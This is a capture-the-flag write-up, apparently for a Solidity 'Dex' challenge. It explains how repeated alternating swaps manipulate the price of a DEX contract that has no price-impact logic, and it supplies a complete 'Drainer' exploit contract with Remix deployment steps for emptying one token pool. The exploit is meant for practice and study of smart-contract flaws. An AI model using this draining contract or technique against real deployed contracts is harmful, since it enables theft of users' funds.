### Goals

Steal at least 1 of the 2 tokens from the Dex contract.

### Exploit

We can manipulate the price by peroforming sequential swaps from one token to another. Creating price disruption. As we can see the Dex contract lacks any logic for price impact so this is the root cause that we will exploit.

|              | token 1 | token 2 |                |   amountOut    |
| :----------: | :-----: | :-----: | :------------: | :------------: |
| 10 token1 in |   100   |   100   | 10 token2 out  | 10\*100/100=10 |
| 20 token2 in |   110   |   90    | 24 token1 out  | 20\*110/90=24  |
| 24 token1 in |   86    |   110   | 30 token2 out  | 24\*110/86=30  |
| 30 token2 in |   110   |   80    | 41 token1 out  | 30\*110/80=41  |
| 41 token1 in |   69    |   110   | 65 token2 out  | 41\*110/69=65  |
| 45 token2 in |   110   |   45    | 110 token1 out | 45\*110/45=110 |

### Code

Deploy contract in Remix

```code
contract Drainer {
    address public token1;
    address public token2;

    bool flag;

    Dex target;

    constructor(address _dex) {
        target = Dex(_dex);
        token1 = target.token1();
        token2 = target.token2();
    }

    function pwn() public {
        target.approve(address(target), 1000);

        // initial disruption
        swap(token1, token2, 10);

        // keep swapping alternately unless flag is set to true
        while (!flag) {
            if(target.balanceOf(token1, address(this)) == 0) {
                swap(token2, token1, target.balanceOf(token2, address(this)));
            } else {
                swap(token1, token2, target.balanceOf(token1, address(this)));
            }
        }
    }

    function swap(address tokenIn, address tokenOut, uint256 amount) internal {
        try target.swap(tokenIn, tokenOut, amount) {
            // ok
        } catch {
            // calculated manually the amountIn to drain the second tokens
            target.swap(tokenIn, tokenOut, 45);
            flag = true;
        }
    }
}
```

Before running `Drainer::pwn()` we need to transfer tokens to the `Drainer`. We could do this by attaching to IERC20 instatnces of tokens in Remix.

Then call `pwn`

Done!
